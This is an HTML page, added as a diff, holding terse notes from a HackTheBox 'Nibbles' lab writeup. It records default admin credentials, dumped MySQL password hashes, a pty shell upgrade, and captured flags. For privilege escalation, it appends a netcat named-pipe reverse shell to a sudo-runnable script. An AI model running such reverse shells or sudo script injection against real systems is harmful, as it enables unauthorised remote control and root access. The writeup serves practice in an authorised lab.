@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nibbles · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/machines/nibbles.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/machines/index.html">Completed Machines</a></div>
+  <h1 id="nibbles">Nibbles</h1>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><a href="http://10.129.221.96/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised">http://10.129.221.96/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised</a></p>
+<p><span class="img-missing">image unavailable</span><br />
+Apache/2.4.18 (Ubuntu)<br />
+<span class="img-missing">image unavailable</span><br />
+JuicyBOOK<br />
+<span class="img-missing">image unavailable</span><br />
+shadow<br />
+keys<br />
+<span class="img-missing">image unavailable</span><br />
+pivot to 10.10.10.134?<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p>test with<br />
+admin<br />
+nibbles</p>
+<p>it works!<br />
+<span class="img-missing">image unavailable</span></p>
+<p>79378f814ff584702cc6ded1950bcd7dd4d4562d<br />
+<span class="img-missing">image unavailable</span></p>
+<h1 id="disable-directory-browsing">Disable directory browsing</h1>
+<p>Options -Indexes</p>
+<h1 id="disable-magic-quotes">Disable Magic Quotes</h1>
+<p>\&lt;IfModule mod_php5.c&gt;<br />
+php_flag magic_quotes_gpc off<br />
+\&lt;/IfModule&gt;</p>
+<h1 id="secure-xml-files">Secure .xml files</h1>
+<p>\&lt;FilesMatch ".(xml)\$"&gt;<br />
+Order Allow,Deny<br />
+Deny from all<br />
+\&lt;/FilesMatch&gt;</p>
+<h1 id="secure-shadowphp">Secure shadow.php</h1>
+<p>\&lt;Files shadow.php&gt;<br />
+order allow,deny<br />
+deny from all<br />
+\&lt;/Files&gt;</p>
+<h1 id="secure-keysphp">Secure keys.php</h1>
+<p>\&lt;Files keys.php&gt;<br />
+order allow,deny<br />
+deny from all<br />
+\&lt;/Files&gt;<br />
+ErrorDocument 404 /nibbleblog/index.php?controller=page&amp;action=404<br />
+\&lt;IfModule mod_rewrite.c&gt;<br />
+RewriteEngine on<br />
+RewriteBase /nibbleblog/<br />
+RewriteRule \^category/([\^/]+)/page-([0-9]+)\$ index.php?controller=blog&amp;action=view&amp;category=\$1&amp;number=\$2 [L]<br />
+RewriteRule \^category/([\^/]+)/\$ index.php?controller=blog&amp;action=view&amp;category=\$1&amp;number=0 [L]<br />
+RewriteRule \^tag/([\^/]+)/page-([0-9]+)\$ index.php?controller=blog&amp;action=view&amp;tag=\$1&amp;number=\$2 [L]<br />
+RewriteRule \^tag/([\^/]+)/\$ index.php?controller=blog&amp;action=view&amp;tag=\$1&amp;number=0 [L]<br />
+RewriteRule \^page-([0-9]+)\$ index.php?controller=blog&amp;action=view&amp;number=\$1 [L]<br />
+RewriteRule \^post/([\^/]+)/\$ index.php?controller=post&amp;action=view&amp;post=\$1 [L]<br />
+RewriteRule \^post-([0-9]+)/(.*)\$ index.php?controller=post&amp;action=view&amp;id_post=\$1 [L]<br />
+RewriteRule \^page/([\^/]+)/\$ index.php?controller=page&amp;action=view&amp;page=\$1 [L]<br />
+RewriteRule \^feed/\$ feed.php [L]<br />
+RewriteRule \^([\^/]+)/\$ index.php?controller=page&amp;action=\$1 [L]<br />
+\&lt;/IfModule&gt;<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p>upgrade shell</p>
+<p>python3 -c 'import pty;pty.spawn("/bin/bash")’</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>user own<br />
+629a9c01b7211d8287a97e314e1314b4</p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+W<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<pre><code class="language-bash">User    Host    authentication_string
+root    localhost   *9CFBBC772F3F6C106020035386DA5BBBF1249A11
+mysql.session   localhost   *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+mysql.sys   localhost   *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+debian-sys-maint    localhost   *0B46F5EC336AFB411DB534D6A50EA98C619B0DE4
+</code></pre>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 8888 &gt; /tmp/f" &gt;&gt; <a href="http://monitor.sh/">monitor.sh</a><br />
+<span class="img-missing">image unavailable</span><br />
+sudo /home/nibbler/personal/stuff/monitor.sh<br />
+<span class="img-missing">image unavailable</span><br />
+root own<br />
+59f84eb7e2bbdae3b8db000c274c5b47<br />
+dde904d29b29ab51b8dbc2602cbcaa58</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
